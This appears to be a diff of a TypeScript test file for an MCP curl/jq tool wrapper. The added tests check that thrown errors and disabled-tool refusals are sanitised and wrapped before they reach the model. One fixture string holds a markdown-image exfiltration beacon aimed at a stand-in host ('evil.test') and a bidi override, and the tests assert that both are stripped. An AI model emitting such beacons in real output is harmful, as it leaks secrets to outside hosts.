@@ -6,8 +6,9 @@
 // in tool-wrapper.e2e.test.ts.
 
 import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
-import { applyConfigTransformsCurl, registerCurlToolWithHooks } from "./tool-wrapper.js";
+import { applyConfigTransformsCurl, registerCurlToolWithHooks, registerJqToolWithHooks } from "./tool-wrapper.js";
 import type { AfterResponseHook, McpCurlConfig, CurlExecuteInput } from "../types/public.js";
+import type { Hooks } from "./types.js";
 import { DEFAULT_USER_AGENT } from "../config/index.js";
 import { clearInjectionDetectionMap } from "../security/detection-logger.js";
 import { isWrappedResult } from "../response/post-processor.js";
@@ -396,6 +397,132 @@ describe("registerCurlToolWithHooks — baseUrl resolution error", () => {
 
         expect(mockExecutor).not.toHaveBeenCalled();
         expect((result as { isError?: boolean }).isError).toBe(true);
+        expect(isWrappedResult(result)).toBe(true);
+    });
+});
+
+// ---------------------------------------------------------------------------
+// Every exit leaves through the wrap (invariant 1). A throw that escaped the
+// handler would be rendered into a result by the MCP SDK with nothing between
+// the thrower's message and the model, so each throw site and both `!enabled`
+// returns are asserted here: the assertion set matches the exit set
+// (LESSONS.md RC-21).
+// ---------------------------------------------------------------------------
+
+// A message a hook or executor would throw with remote text in it: a beacon the
+// markdown stage strips and a bidi override the sanitiser removes.
+const THROWN_MESSAGE = "upstream said: ![x](https://evil.test/?d=secret) ‮evil";
+
+describe("throwing hooks and executors leave through the wrap (invariant 1)", () => {
+    const okExecutor = () =>
+        vi.fn().mockResolvedValue({ content: [{ type: "text", text: "ok" }], isError: false });
+
+    function registerWith(hooks: Partial<Hooks>, executor = okExecutor()) {
+        const { server: fakeServer, tools } = captureTools();
+        const onError = vi.fn();
+        registerCurlToolWithHooks(fakeServer, {
+            executor: executor as never,
+            enabled: true,
+            config: { enableSpotlighting: false } as McpCurlConfig,
+            hooks: { beforeRequest: [], afterResponse: [], onError: [onError], ...hooks },
+        });
+        const call = () => tools.get("curl_execute")!.handler(makeParams(), { sessionId: undefined });
+        return { call, onError, executor };
+    }
+
+    function expectDefended(result: unknown): void {
+        const { content, isError } = result as { content: { text: string }[]; isError?: boolean };
+        expect(isError).toBe(true);
+        expect(isWrappedResult(result)).toBe(true);
+        expect(content[0].text).toContain("upstream said:");
+        expect(content[0].text).not.toContain("evil.test");
+        expect(content[0].text).not.toContain("‮");
+    }
+
+    it("a throwing beforeRequest hook returns a defended error result and reaches onError", async () => {
+        const error = new Error(THROWN_MESSAGE);
+        const { call, onError, executor } = registerWith({
+            beforeRequest: [() => { throw error; }],
+        });
+
+        expectDefended(await call());
+        expect(executor).not.toHaveBeenCalled();
+        expect(onError).toHaveBeenCalledTimes(1);
+        expect(onError.mock.calls[0][0].error).toBe(error);
+    });
+
+    it("a throwing afterResponse hook returns a defended error result and reaches onError", async () => {
+        const error = new Error(THROWN_MESSAGE);
+        const { call, onError } = registerWith({
+            afterResponse: [() => { throw error; }],
+        });
+
+        expectDefended(await call());
+        expect(onError).toHaveBeenCalledTimes(1);
+        expect(onError.mock.calls[0][0].error).toBe(error);
+    });
+
+    it("a rejecting executor returns a defended error result and reaches onError", async () => {
+        const error = new Error(THROWN_MESSAGE);
+        const { call, onError } = registerWith({}, vi.fn().mockRejectedValue(error));
+
+        expectDefended(await call());
+        expect(onError).toHaveBeenCalledTimes(1);
+        expect(onError.mock.calls[0][0].error).toBe(error);
+    });
+
+    it("a thrown non-Error is returned as its string form", async () => {
+        const { call } = registerWith({
+            beforeRequest: [() => { throw "not an Error"; }],
+        });
+
+        const result = (await call()) as { content: { text: string }[]; isError?: boolean };
+        expect(result.isError).toBe(true);
+        expect(result.content[0].text).toBe("not an Error");
+        expect(isWrappedResult(result)).toBe(true);
+    });
+});
+
+describe("a disabled tool's refusal leaves through the wrap (invariant 1)", () => {
+    const hooks: Hooks = { beforeRequest: [], afterResponse: [], onError: [] };
+
+    it("curl_execute", async () => {
+        const { server: fakeServer, tools } = captureTools();
+        const executor = vi.fn();
+        registerCurlToolWithHooks(fakeServer, {
+            executor: executor as never,
+            enabled: false,
+            config: {} as McpCurlConfig,
+            hooks,
+        });
+
+        const result = (await tools.get("curl_execute")!.handler(makeParams(), { sessionId: undefined })) as {
+            content: { text: string }[];
+            isError?: boolean;
+        };
+        expect(executor).not.toHaveBeenCalled();
+        expect(result.isError).toBe(true);
+        expect(result.content[0].text).toBe("Error: curl_execute tool is disabled");
+        expect(isWrappedResult(result)).toBe(true);
+    });
+
+    it("jq_query", async () => {
+        const { server: fakeServer, tools } = captureTools();
+        const executor = vi.fn();
+        registerJqToolWithHooks(fakeServer, {
+            executor: executor as never,
+            enabled: false,
+            config: {} as McpCurlConfig,
+            hooks,
+        });
+
+        const result = (await tools.get("jq_query")!.handler(
+            { filepath: "/tmp/none.json", filter: "." },
+            { sessionId: undefined }
+        )) as { content: { text: string }[]; isError?: boolean };
+        expect(executor).not.toHaveBeenCalled();
+        expect(result.isError).toBe(true);
+        expect(result.content[0].text).toBe("Error: jq_query tool is disabled");
         expect(isWrappedResult(result)).toBe(true);
     });
 });
